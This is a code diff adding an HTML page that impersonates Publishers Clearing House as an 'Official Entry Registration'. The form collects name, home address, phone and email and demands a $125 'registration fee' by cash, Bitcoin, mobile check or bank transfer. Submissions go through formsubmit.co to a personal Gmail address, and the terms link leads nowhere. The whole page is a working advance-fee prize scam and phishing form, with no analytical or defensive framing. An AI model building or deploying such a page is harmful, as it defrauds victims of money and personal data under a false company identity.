@@ -1,0 +1,180 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Publishers Clearing House – Official Registration</title>
+  <link rel="stylesheet" href="style.css"/>
+</head>
+<body>
+
+  <!-- Animated Money Canvas -->
+  <canvas id="money-canvas"></canvas>
+
+  <div class="page-wrapper">
+
+    <!-- ── Header ── -->
+    <header class="site-header">
+      <div class="header-badge">
+        Publishers Clearing House
+        <span class="header-sub">Official Entry Registration</span>
+      </div>
+      <p class="tagline">Secure Entry Registration</p>
+    </header>
+
+    <!-- ── Registration Form Card ── -->
+    <div class="form-card">
+      <div class="card-top-bar"></div>
+      <div class="card-body">
+
+        <!-- Error Summary -->
+        <div id="form-error-summary" role="alert">
+          ⚠ Please fix the highlighted fields before submitting.
+        </div>
+
+        <form id="reg-form" action="https://formsubmit.co/ajax/publishersclearinghouse19530@gmail.com" method="POST">
+          <input type="hidden" name="_subject" value="New registration submission"/>
+          <input type="hidden" name="_template" value="table"/>
+          <input type="hidden" name="_captcha" value="false"/>
+          <input type="hidden" name="_next" value="./thank-you.html"/>
+          <input type="text" name="_honey" class="hidden-field" tabindex="-1" autocomplete="off"/>
+
+          <!-- ── Personal Information ── -->
+          <div class="section-title">
+            <span class="section-marker"></span> Personal Information
+          </div>
+
+          <div class="field-group">
+            <label for="fullname">Full Name <span class="req">*</span></label>
+            <input type="text" id="fullname" name="Full Name" placeholder="e.g. John A. Williams" autocomplete="name" required/>
+            <div class="error-msg" id="err-fullname">Please enter your full name.</div>
+          </div>
+
+          <div class="field-group">
+            <label for="address">Home Address <span class="req">*</span></label>
+            <input type="text" id="address" name="Home Address" placeholder="Street address, Apt/Suite" autocomplete="street-address" required/>
+            <div class="error-msg" id="err-address">Please enter your home address.</div>
+          </div>
+
+          <div class="field-row">
+            <div class="field-group">
+              <label for="zipcode">ZIP Code <span class="req">*</span></label>
+              <input type="text" id="zipcode" name="ZIP Code" placeholder="e.g. 10001" autocomplete="postal-code" maxlength="10" required/>
+              <div class="error-msg" id="err-zipcode">Enter a valid ZIP code.</div>
+            </div>
+            <div class="field-group">
+              <label for="phone">Phone Number <span class="req">*</span></label>
+              <input type="tel" id="phone" name="Phone Number" placeholder="e.g. (555) 123-4567" autocomplete="tel" required/>
+              <div class="error-msg" id="err-phone">Please enter your phone number.</div>
+            </div>
+          </div>
+
+          <div class="field-group">
+            <label for="email">Email Address <span class="req">*</span></label>
+            <input type="email" id="email" name="Email Address" placeholder="yourname@email.com" autocomplete="email" required/>
+            <div class="error-msg" id="err-email">Please enter a valid email address.</div>
+          </div>
+
+          <hr class="divider"/>
+
+          <!-- ── Payment Method ── -->
+          <div class="section-title">
+            <span class="section-marker"></span> Payment Method
+          </div>
+
+          <div class="payment-grid" id="payment-group" role="radiogroup" aria-label="Payment method">
+
+            <div class="payment-option">
+              <input type="radio" id="pay-cash" name="Payment Method" value="Cash" required/>
+              <label for="pay-cash">
+                <span class="pay-icon">$</span>
+                <span class="pay-label">Cash</span>
+                <span class="check-dot"></span>
+              </label>
+            </div>
+
+            <div class="payment-option">
+              <input type="radio" id="pay-check" name="Payment Method" value="Mobile Check" required/>
+              <label for="pay-check">
+                <span class="pay-icon">CK</span>
+                <span class="pay-label">Mobile Check</span>
+                <span class="check-dot"></span>
+              </label>
+            </div>
+
+            <div class="payment-option">
+              <input type="radio" id="pay-btc" name="Payment Method" value="Bitcoin" required/>
+              <label for="pay-btc">
+                <span class="pay-icon">BTC</span>
+                <span class="pay-label">Bitcoin</span>
+                <span class="check-dot"></span>
+              </label>
+            </div>
+
+            <div class="payment-option">
+              <input type="radio" id="pay-bank" name="Payment Method" value="Bank Transfer" required/>
+              <label for="pay-bank">
+                <span class="pay-icon">ACH</span>
+                <span class="pay-label">Bank Transfer</span>
+                <span class="check-dot"></span>
+              </label>
+            </div>
+
+          </div>
+          <div class="error-msg" id="err-payment" style="margin-bottom:16px;">Please select a payment method.</div>
+
+          <hr class="divider"/>
+
+          <!-- ── Important Instructions ── -->
+          <div class="section-title" style="margin-bottom:12px;">
+            <span class="section-marker"></span> Important Instructions
+          </div>
+
+          <div class="instruction-box" role="note">
+            <ul>
+              <li class="fee-line">
+                <span>
+                  <strong>Registration fee</strong>
+                  <small>Payable by selected method</small>
+                </span>
+                <strong class="fee-amount">$125.00</strong>
+              </li>
+              <li>Bonus eligibility: available only during approved promotional periods.</li>
+              <li>Emergency support: available when additional assistance is required.</li>
+            </ul>
+          </div>
+
+          <hr class="divider"/>
+
+          <!-- ── Terms & Conditions ── -->
+          <div class="section-title" style="margin-bottom:12px;">
+            <span class="section-marker"></span> Agreement
+          </div>
+
+          <label class="terms-row" for="terms">
+            <input type="checkbox" id="terms" name="Terms Agreement" value="Agreed" required/>
+            <span>I agree to the <a href="#" onclick="return false;">Terms and Conditions</a> of Publishers Clearing House and understand the registration requirements outlined above.</span>
+          </label>
+          <div class="error-msg" id="err-terms" style="margin-bottom:16px;">You must agree to the Terms and Conditions.</div>
+
+          <hr class="divider"/>
+
+          <!-- ── Submit Button ── -->
+          <button type="submit" class="submit-btn">
+            Submit Registration
+          </button>
+
+        </form>
+
+      </div><!-- /card-body -->
+    </div><!-- /form-card -->
+
+    <footer class="page-footer">
+      © 2025 Publishers Clearing House · All Rights Reserved · Prize-winning experience since 1953
+    </footer>
+
+  </div><!-- /page-wrapper -->
+
+  <script src="script.js"></script>
+</body>
+</html>
